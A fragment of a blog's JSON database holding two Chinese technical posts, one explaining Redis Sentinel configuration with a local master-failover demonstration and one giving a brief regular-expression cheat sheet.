\n6379已不是主redis，变成了从redis,不能再write操作，只能read.\n\n","slug":"redis-8","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llu20011g2x6d6ieg1f4","content":"<p>Redis-Sentinel是Redis官方推荐的高可用性(HA)解决方案，当用Redis做Master-slave的高可用方案时，假如master宕机了，Redis本身(包括它的很多客户端)都没有实现自动进行主备切换，而Redis-sentinel本身也是一个独立运行的进程，它能监控多个master-slave集群，发现master宕机后能进行自懂切换。<br><a id=\"more\"></a></p>\n<h2 id=\"Sentinel任务\"><a href=\"#Sentinel任务\" class=\"headerlink\" title=\"Sentinel任务\"></a>Sentinel任务</h2><ul>\n<li>监控:Sentinel 会不断地检查你的主服务器和从服务器是否运作正常。</li>\n<li>提醒:当被监控的某个Redis服务器出现问题时,Sentinel 可以通过API向管理员或者其他应用程序发送通知。</li>\n<li>自动故障迁移:当一个主服务器不能正常工作时,Sentinel 会开始一次自动故障迁移操作， 它会将失效主服务器的其中一个从服务器升级为新的主服务器, 并让失效主服务器的其他从服务器改为复制新的主服务器;当客户端试图连接失效的主服务器时,集群也会向客户端返回新主服务器的地址,使得集群可以使用新主服务器代替失效服务器。</li>\n</ul>\n<h2 id=\"配置Sentinel\"><a href=\"#配置Sentinel\" class=\"headerlink\" title=\"配置Sentinel\"></a>配置Sentinel</h2><p>下面是一个Sentinel的标准配置<br>port 26370<br>sentinel monitor master 127.0.0.1 6381 1<br>sentinel auth-pass master yanbin<br>sentinel down-after-milliseconds master 60000<br>sentinel parallel-syncs master 5<br>第一行配置指示Sentinel去监视一个名为master的主服务器,将这个主服务器判断为失效至少需要1个Sentinel同意。只要同意Sentinel的数量不达标,自动故障迁移就不会执行。<br>down-after-milliseconds 指定了Sentinel认为服务器已经断线所需的毫秒数。<br>parallel-syncs 执行故障转移时,最多可以有多少个从服务器同时对新的主服务器进行同步,数字越小,完成故障转移所需的时间就越长。<br>auth-pass 监视主服务器的密码。</p>\n<h2 id=\"运行Sentinel\"><a href=\"#运行Sentinel\" class=\"headerlink\" title=\"运行Sentinel\"></a>运行Sentinel</h2><p>Sentinel配置在我这个windows 2.8这个版本中是没有的，我自建了一个sentinel.conf配置文件。然后使用命令行启动Sentinel：<br>redis-server  sentinel.conf –sentinel</p>\n<h2 id=\"故障演示\"><a href=\"#故障演示\" class=\"headerlink\" title=\"故障演示\"></a>故障演示</h2><p>集群配置最少需要启动三个服务，我启动了4个服务分别是<br>127.0.0.1:26370 （redis sentinel 集群监控）<br>127.0.0.1:6379  （redis 主）<br>127.0.0.1:6380  （redis 从）<br>127.0.0.1:6381  （redis 从）<br>查看网络状态</p>\n<pre><code class=\"bash\">$ redis-cli -h 127.0.0.1 -p 26380 info Sentinel\nSentinel\nsentinel_masters:1\nsentinel_tilt:0\nsentinel_running_scripts:0\nsentinel_scripts_queue_length:0\nmaster0:name=master,status=ok,address=127.0.0.1:6379,slaves=2,sentinels=1\n</code></pre>\n<p>接着我关闭一个服务</p>\n<pre><code class=\"bash\">redis-cli -h 127.0.0.1 -p 6379 shutdow\n</code></pre>\n<p>过了一会再次查看网络</p>\n<pre><code class=\"bash\">$ redis-cli -h 127.0.0.1 -p 26380 info Sentinel\n<span class=\"comment\">#Sentinel</span>\nsentinel_masters:1\nsentinel_tilt:0\nsentinel_running_scripts:0\nsentinel_scripts_queue_length:0\nmaster0:name=master,status=ok,address=127.0.0.1:6381,slaves=1,sentinels=1\n</code></pre>\n<p>6381变成主redis,可以write操作。<br>再次启动6379</p>\n<pre><code class=\"bash\">$ redis-cli -h 127.0.0.1 -p 26380 info Sentinel\n<span class=\"comment\">#Sentinel</span>\nsentinel_masters:1\nsentinel_tilt:0\nsentinel_running_scripts:0\nsentinel_scripts_queue_length:0\nmaster0:name=master,status=ok,address=127.0.0.1:6381,slaves=2,sentinels=1\n</code></pre>\n<p>6379已不是主redis，变成了从redis,不能再write操作，只能read.</p>\n","excerpt":"<p>Redis-Sentinel是Redis官方推荐的高可用性(HA)解决方案，当用Redis做Master-slave的高可用方案时，假如master宕机了，Redis本身(包括它的很多客户端)都没有实现自动进行主备切换，而Redis-sentinel本身也是一个独立运行的进程，它能监控多个master-slave集群，发现master宕机后能进行自懂切换。<br>","more":"</p>\n<h2 id=\"Sentinel任务\"><a href=\"#Sentinel任务\" class=\"headerlink\" title=\"Sentinel任务\"></a>Sentinel任务</h2><ul>\n<li>监控:Sentinel 会不断地检查你的主服务器和从服务器是否运作正常。</li>\n<li>提醒:当被监控的某个Redis服务器出现问题时,Sentinel 可以通过API向管理员或者其他应用程序发送通知。</li>\n<li>自动故障迁移:当一个主服务器不能正常工作时,Sentinel 会开始一次自动故障迁移操作， 它会将失效主服务器的其中一个从服务器升级为新的主服务器, 并让失效主服务器的其他从服务器改为复制新的主服务器;当客户端试图连接失效的主服务器时,集群也会向客户端返回新主服务器的地址,使得集群可以使用新主服务器代替失效服务器。</li>\n</ul>\n<h2 id=\"配置Sentinel\"><a href=\"#配置Sentinel\" class=\"headerlink\" title=\"配置Sentinel\"></a>配置Sentinel</h2><p>下面是一个Sentinel的标准配置<br>port 26370<br>sentinel monitor master 127.0.0.1 6381 1<br>sentinel auth-pass master yanbin<br>sentinel down-after-milliseconds master 60000<br>sentinel parallel-syncs master 5<br>第一行配置指示Sentinel去监视一个名为master的主服务器,将这个主服务器判断为失效至少需要1个Sentinel同意。只要同意Sentinel的数量不达标,自动故障迁移就不会执行。<br>down-after-milliseconds 指定了Sentinel认为服务器已经断线所需的毫秒数。<br>parallel-syncs 执行故障转移时,最多可以有多少个从服务器同时对新的主服务器进行同步,数字越小,完成故障转移所需的时间就越长。<br>auth-pass 监视主服务器的密码。</p>\n<h2 id=\"运行Sentinel\"><a href=\"#运行Sentinel\" class=\"headerlink\" title=\"运行Sentinel\"></a>运行Sentinel</h2><p>Sentinel配置在我这个windows 2.8这个版本中是没有的，我自建了一个sentinel.conf配置文件。然后使用命令行启动Sentinel：<br>redis-server  sentinel.conf –sentinel</p>\n<h2 id=\"故障演示\"><a href=\"#故障演示\" class=\"headerlink\" title=\"故障演示\"></a>故障演示</h2><p>集群配置最少需要启动三个服务，我启动了4个服务分别是<br>127.0.0.1:26370 （redis sentinel 集群监控）<br>127.0.0.1:6379  （redis 主）<br>127.0.0.1:6380  （redis 从）<br>127.0.0.1:6381  （redis 从）<br>查看网络状态</p>\n<pre><code class=\"bash\">$ redis-cli -h 127.0.0.1 -p 26380 info Sentinel\nSentinel\nsentinel_masters:1\nsentinel_tilt:0\nsentinel_running_scripts:0\nsentinel_scripts_queue_length:0\nmaster0:name=master,status=ok,address=127.0.0.1:6379,slaves=2,sentinels=1\n</code></pre>\n<p>接着我关闭一个服务</p>\n<pre><code class=\"bash\">redis-cli -h 127.0.0.1 -p 6379 shutdow\n</code></pre>\n<p>过了一会再次查看网络</p>\n<pre><code class=\"bash\">$ redis-cli -h 127.0.0.1 -p 26380 info Sentinel\n<span class=\"comment\">#Sentinel</span>\nsentinel_masters:1\nsentinel_tilt:0\nsentinel_running_scripts:0\nsentinel_scripts_queue_length:0\nmaster0:name=master,status=ok,address=127.0.0.1:6381,slaves=1,sentinels=1\n</code></pre>\n<p>6381变成主redis,可以write操作。<br>再次启动6379</p>\n<pre><code class=\"bash\">$ redis-cli -h 127.0.0.1 -p 26380 info Sentinel\n<span class=\"comment\">#Sentinel</span>\nsentinel_masters:1\nsentinel_tilt:0\nsentinel_running_scripts:0\nsentinel_scripts_queue_length:0\nmaster0:name=master,status=ok,address=127.0.0.1:6381,slaves=2,sentinels=1\n</code></pre>\n<p>6379已不是主redis，变成了从redis,不能再write操作，只能read.</p>"},{"title":"正则速记","date":"2016-08-17T16:00:00.000Z","desc":"mac 快捷键 效率工具","_content":"\n## 元字符\n.   :匹配任意字符\n\\   :转义\n^  :行开始位置\n$  :行结束位置\n\n## 范围\n[  ]:\n[0-9],[a-z] : 字符范围\n^ : 取反   [^a]\n\n## 重复\n{ }:\na{3}   3次\na{3,5} 3到5次\n?等于{0,1}\n*等于{0,}\n+等于{1,}\n\n## 分组与选择 \n|:\ncat|dog, [cat|dog]\n(cat|dog)\n\n## 常用集合:\n\\w = [0-9A-Za-z]    \\s  空格, 制表符,回车或换行符\n\\W = [^0-9A-Za-z]  \\d   数值","source":"_posts/regex.md","raw":"---\ntitle: 正则速记\ndate: 2016-8-18\ndesc: mac 快捷键 效率工具\n---\n\n## 元字符\n.   :匹配任意字符\n\\   :转义\n^  :行开始位置\n$  :行结束位置\n\n## 范围\n[  ]:\n[0-9],[a-z] : 字符范围\n^ : 取反   [^a]\n\n## 重复\n{ }:\na{3}   3次\na{3,5} 3到5次\n?等于{0,1}\n*等于{0,}\n+等于{1,}\n\n## 分组与选择 \n|:\ncat|dog, [cat|dog]\n(cat|dog)\n\n## 常用集合:\n\\w = [0-9A-Za-z]    \\s  空格, 制表符,回车或换行符\n\\W = [^0-9A-Za-z]  \\d   数值","slug":"regex","published":1,"updated":"2016-09-04T14:50:13.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llu80012g2x6xq027srx","content":"<h2 id=\"元字符\"><a href=\"#元字符\" class=\"headerlink\" title=\"元字符\"></a>元字符</h2><p>.   :匹配任意字符<br>\\   :转义<br>^  :行开始位置<br>$  :行结束位置</p>\n<h2 id=\"范围\"><a href=\"#范围\" class=\"headerlink\" title=\"范围\"></a>范围</h2><p>[  ]:<br>[0-9],[a-z] : 字符范围<br>^ : 取反   [^a]</p>\n<h2 id=\"重复\"><a href=\"#重复\" class=\"headerlink\" title=\"重复\"></a>重复</h2><p>{ }:<br>a{3}   3次<br>a{3,5} 3到5次<br>?等于{0,1}<br>*等于{0,}<br>+等于{1,}</p>\n<h2 id=\"分组与选择\"><a href=\"#分组与选择\" class=\"headerlink\" title=\"分组与选择\"></a>分组与选择</h2><p>|:<br>cat|dog, [cat|dog]<br>(cat|dog)</p>\n<h2 id=\"常用集合\"><a href=\"#常用集合\" class=\"headerlink\" title=\"常用集合:\"></a>常用集合:</h2><p>\\w = [0-9A-Za-z]    \\s  空格, 制表符,回车或换行符<br>\\W = [^0-9A-Za-z]  \\d   数值</p>\n","excerpt":"","more":"<h2 id=\"元字符\"><a href=\"#元字符\" class=\"headerlink\" title=\"元字符\"></a>元字符</h2><p>.   :匹配任意字符<br>\\   :转义<br>^  :行开始位置<br>$  :行结束位置</p>\n<h2 id=\"范围\"><a href=\"#范围\" class=\"headerlink\" title=\"范围\"></a>范围</h2><p>[  ]:<br>[0-9],[a-z] : 字符范围<br>^ : 取反   [^a]</p>\n<h2 id=\"重复\"><a href=\"#重复\" class=\"headerlink\" title=\"重复\"></a>重复</h2><p>{ }:<br>a{3}   3次<br>a{3,5} 3到5次<br>?等于{0,1}<br>*等于{0,}<br>+等于{1,}</p>\n<h2 id=\"分组与选择\"><a href=\"#分组与选择\" class=\"headerlink\" title=\"分组与选择\"></a>分组与选择</h2><p>|:<br>cat|dog, [cat|dog]<br>(cat|dog)</p>\n<h2 id=\"常用集合\"><a href=\"#常用集合\" class=\"headerlink\" title=\"常用集合:\"></a>常用集合:</h2><p>\\w = [0-9A-Za-z]    \\s  空格, 制表符,回车或换行符<br>\\W = [^0-9A-Za-z]  \\d   数值</p>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[],"Tag":[]}}